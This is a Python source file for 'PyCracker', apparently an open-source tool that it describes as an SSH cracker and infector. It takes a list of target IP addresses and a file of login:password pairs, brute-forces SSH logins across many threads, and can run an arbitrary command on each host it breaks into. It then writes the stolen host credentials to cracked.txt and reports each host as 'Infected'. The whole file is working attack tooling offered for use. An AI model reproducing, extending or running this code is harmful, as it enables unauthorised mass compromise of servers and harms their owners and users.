#!/usr/bin/python3
## Github: https://github.com/target111
## Project main repository: https://github.com/target111/PyCracker
##
## This file is part of PyCracker.
##
## PyCracker is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 2 of the License, or
## (at your option) any later version.
##
## PyCracker is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with PyCracker.  If not, see <http://www.gnu.org/licenses/>.
##

import paramiko, os, sys, argparse, socket, time
from enum import Enum
from threading import Thread

paramiko.util.log_to_file("/dev/null") # Prevents paramiko error spam.

def chunkify(lst, threads): # split the ip list in equal chunks
    return [lst[i::threads] for i in range(threads)]

def printEx (message, type): # format the text
    print_type_str = ""
    if type == PrintType.Error:
        print_type_str = ConsoleColors.FAIL + "[ERROR]" + ConsoleColors.ENDC
    elif type == PrintType.Warning:
        print_type_str = ConsoleColors.WARNING + "[WARN]" + ConsoleColors.ENDC
    elif type == PrintType.Info:
        print_type_str = ConsoleColors.OKBLUE + "[INFO]" + ConsoleColors.ENDC

    print(print_type_str + " " + message)

def is_valid_ipv4_address(address):
    try:
        socket.inet_pton(socket.AF_INET, address)
    except AttributeError:  # no inet_pton here, sorry
        try:
            socket.inet_aton(address)
        except socket.error:
            return False
        return address.count('.') == 3
    except socket.error:  # not a valid address
        return False

    return True

class ConsoleColors: # fancy colors :D
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class PrintType (Enum):
    Error = 1
    Warning = 2
    Info = 3

class SshCracker(Thread): # ssh cracker class
    def __init__(self, targets, creds, command=None):
        Thread.__init__(self)

        self.targets = targets
        self.creds   = creds
        self.command = command

        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    def writeToFile(self, data):
        with open("cracked.txt", "a") as f:
            f.write(data)

    def run(self):
        for target in self.targets:
            for combo in self.creds:
                try:
                    # try to connect to host
                    self.ssh.connect(target, port = 22, username = combo.split(":")[0], password = combo.split(":")[1], timeout = 3)

                    # if we're here it means the creditentials were correct.
                    stdin, stdout, stderr = self.ssh.exec_command("/sbin/ifconfig")

                    # check if the host is good
                    if b"inet" in stdout.read():
                        if self.command: # WIP
                            self.ssh.exec_command(self.command)

                        # save host to file. TODO: what happens if multiple threads open the file at the same time?
                        self.writeToFile("%s:%s:%s" % (target, combo.split(":")[0], combo.split(":")[1]))
                        # report to the user
                        printEx("Infected %s | %s:%s" % (target, combo.split(":")[0], combo.split(":")[1]), PrintType.Info)

                    self.ssh.close() # close the connection

                    # no point in trying any other combinations. go to the next address.
                    break

                except Exception:
                    self.ssh.close()

def parse_args(): # parse user arguments
    arg_parser = argparse.ArgumentParser(description="""
An advanced python SSH cracker and infector. Aimed to be simple to use, simple to develop.
""", formatter_class=argparse.RawDescriptionHelpFormatter)
    arg_parser.add_argument('ip_file', help='list of servers to attack, one entry per line')
    arg_parser.add_argument('-C', '--creds', default='creds.txt', help='colon separated "login:pass" file')
    arg_parser.add_argument('-t', '--threads', type=int, help='run with n threads')
    arg_parser.add_argument('--command', help='execute a command on the host')
    args = arg_parser.parse_args()

    return args

def run(args):
    if os.path.isfile(args.ip_file): # check ip file
        with open(args.ip_file, "r") as f:
            ip_list = []

            for line in f.readlines():
                ip_list.append(line.strip("\n"))

            for ip in ip_list:
                if not is_valid_ipv4_address(ip):
                    ip_list.remove(ip)
    else:
        printEx("No such file: %s" % args.ip_file, PrintType.Error)


    if os.path.isfile(args.creds): # check creditentials file
        with open(args.creds, "r") as f:
            creds_list = []

            for line in f.readlines():
                if len(line.split(":")) == 2:
                    creds_list.append(line.strip("\n"))
    else:
        printEx("No such file: %s" % args.ip_file, PrintType.Error)

    if args.threads: # set number of threads.
        if args.threads > len(ip_list):
            printEx("Thread count exceeds number of targets. Attacking one server per thread.", PrintType.Warning)
            args.threads = len(ip_list)
    else:
        if len(ip_list) == 1:
            args.threads = 1
        else:
            args.threads = int(len(ip_list) / 2)

    for ips in chunkify(ip_list, args.threads): # make ip chunks for threads
        SshCracker(ips, creds_list, args.command).start() # start each thread

def main(): # main function
    run(parse_args())

# only run as a .py
if __name__ == "__main__":
    main()
